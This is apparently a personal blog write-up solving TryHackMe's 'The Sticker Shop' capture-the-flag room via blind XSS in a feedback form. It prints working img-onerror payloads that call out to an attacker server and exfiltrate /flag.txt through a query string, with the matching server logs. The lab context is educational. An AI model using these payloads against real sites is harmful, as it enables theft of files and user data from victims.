---
title: "TryHackMe - The Sticker Shop"
author: Nasrallah
description: ""
date:2024-12-05 12:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, web, easy, xss]
img_path: /assets/img/tryhackme/thestickershop
image:
    path: /assets/img/tryhackme/thestickershop/thestickershop.png
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---

[The Sticker Shop](https://tryhackme.comr/r/room/thestickershop) from [TryHackMe](https://tryhackme.com/signup?referrer=603949780215185dfb191142) is a simple web challenge where we exploit an XSS vulnerability to read the flag.

## **Enumeration**

### Web

This is a web challenge and the website can be found on port 8080.

![website](/assets/img/tryhackme/thestickershop/1.png)

It's a sticker shop, nothing looks interesting on the home page, let's check the feedback page.

![feedback](/assets/img/tryhackme/thestickershop/2.png)

Here we can submit a feedback.

The first thing that comes to mind is to check if links are being clicked, so I entered my ip address but didn't receive anything on my http server.

Next thing is XSS, Trying multiple payloads I managed to get a hit with the following payload:

```js
<img src="nonexistent.jpg" onerror="fetch('http://10.8.81.165');">
```

```terminal
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.206.107 - - [03/Dec/2024 10:25:28] "GET / HTTP/1.1" 200 -  
```

Now we need to read the file located in `/flag.txt`.

With the help of ChatGPT and some trial and error we ended up with the following payload that reads the file.

```javascript
<img src="nonexistent.jpg" onerror="fetch('/flag.txt').then(r=>r.text()).then(d=>fetch(`http://your-attack-server.com?fileContent=${encodeURIComponent(d)}`));">
```

```terminal
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.206.107 - - [03/Dec/2024 10:35:16] "GET /?fileContent=THM%7B8[REDACTED]ee6%7D HTTP/1.1" 200 -
```

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---
